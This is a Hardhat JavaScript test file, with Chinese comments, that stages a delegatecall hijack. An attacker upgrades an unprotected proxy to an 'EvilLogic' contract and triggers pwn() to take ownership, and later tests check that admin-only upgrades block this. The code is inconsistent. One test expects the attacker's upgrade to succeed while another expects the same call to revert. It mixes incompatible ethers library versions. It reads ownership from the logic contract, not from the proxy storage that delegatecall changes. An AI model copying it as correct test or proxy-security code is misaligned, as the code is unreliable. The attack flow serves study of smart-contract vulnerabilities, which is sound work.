const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Delegatecall Hijack Attack Test", function () {
  let logic;
  let evilLogic;
  let delegatecallHijack;
  let owner;
  let attacker;

  beforeEach(async () => {
    [owner, attacker] = await ethers.getSigners();

    // 部署 Logic 合约
    const Logic = await ethers.getContractFactory("Logic");
    logic = await Logic.deploy();
    console.log("Logic contract deployed to:", await logic.getAddress());

    // 部署 DelegatecallHijack 合约并传入 Logic 地址
    const DelegatecallHijack = await ethers.getContractFactory("DelegatecallHijack");
    delegatecallHijack = await DelegatecallHijack.deploy(await logic.getAddress());
    console.log("DelegatecallHijack contract deployed to:", await delegatecallHijack.getAddress());

    // 检查初始 owner 为 0x0
    const initialOwner = await logic.owner();
    console.log("Initial owner in Logic contract:", initialOwner);
    // expect(initialOwner).to.equal(ethers.constants.AddressZero);
  });

  it("Should allow attacker to hijack ownership by upgrading to EvilLogic", async () => {
    // 部署 EvilLogic 合约
    const EvilLogic = await ethers.getContractFactory("EvilLogic");
    evilLogic = await EvilLogic.deploy();
    console.log("EvilLogic contract deployed to:", await evilLogic.getAddress());

    // 攻击流程：攻击者调用 upgradeTo(EvilLogic)
    await delegatecallHijack.connect(attacker).upgradeTo(await evilLogic.getAddress());
    console.log("Upgrade to EvilLogic completed");

    // 攻击流程：攻击者调用 fallback（执行 pwn()）
    const tx = await delegatecallHijack.connect(attacker).fallback();
    await tx.wait(); // 确保 fallback 完成

    console.log("Fallback executed by attacker");

    // 检查 owner 被攻击者改为攻击者地址
    const ownerAfterAttack = await logic.owner();
    console.log("Owner after attack:", ownerAfterAttack);
    expect(ownerAfterAttack).to.equal(attacker.address);
  });

  it("Should prevent non-admin from upgrading to new implementation", async () => {
    // 修复流程：非 admin 尝试调用 upgradeTo => revert
    const Logic = await ethers.getContractFactory("Logic");
    const newLogic = await Logic.deploy();
    await expect(
      delegatecallHijack.connect(attacker).upgradeTo(newLogic.address)
    ).to.be.revertedWith("Not admin");
    console.log("Non-admin upgrade attempt reverted as expected");
  });

  it("Should revert if non-contract address is passed to upgradeTo", async () => {
    // 修复流程：传入非合约地址 => revert
    await expect(
      delegatecallHijack.connect(owner).upgradeTo(ethers.constants.AddressZero)
    ).to.be.revertedWith("Not contract");
    console.log("Non-contract address passed to upgradeTo reverted as expected");
  });

  it("Should allow admin to upgrade and execute delegatecall successfully", async () => {
    // 修复流程：管理员升级合约并成功执行 delegatecall
    const Logic = await ethers.getContractFactory("Logic");
    const newLogic = await Logic.deploy();
    await delegatecallHijack.connect(owner).upgradeTo(newLogic.address);
    console.log("Upgrade to new Logic contract completed");

    // 执行 delegatecall
    const tx = await delegatecallHijack.connect(owner).fallback();
    await tx.wait();
    console.log("Delegatecall executed by admin successfully");
  });
});
